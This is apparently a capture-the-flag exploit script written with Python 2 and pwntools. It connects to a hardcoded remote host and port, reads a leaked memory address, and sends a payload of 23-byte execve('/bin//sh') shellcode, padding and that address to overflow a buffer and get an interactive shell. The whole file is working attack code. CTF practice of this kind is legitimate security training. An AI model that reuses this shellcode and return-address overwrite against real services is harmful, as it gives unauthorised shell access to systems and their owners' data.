#!/usr/bin/python
# @auther baseline
# github : https://github.com/windyware

from pwn import *
import re

# prase addr from recv data
def prase_addr(buf):
	re_addr = re.compile(r"0x([0-9A-Z].+)")
	addr = re_addr.findall(buf)
	if addr == None:
		return None
	else:
		return addr[0]	
# get link
io = remote('121.194.2.42', 8003)

start_address = int(prase_addr(io.recv(1024)), 16)
print '[+] system addr :' , hex(start_address)


# prepare payload
payload = ''

#shellcode 23bytes
shellcode = '\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05' 

payload += shellcode
payload += 'A'*17
payload += p64(start_address)

# exploit
print '[+] exploit'

io.sendline(payload)

print '[+] shell is ready'
io.interactive()

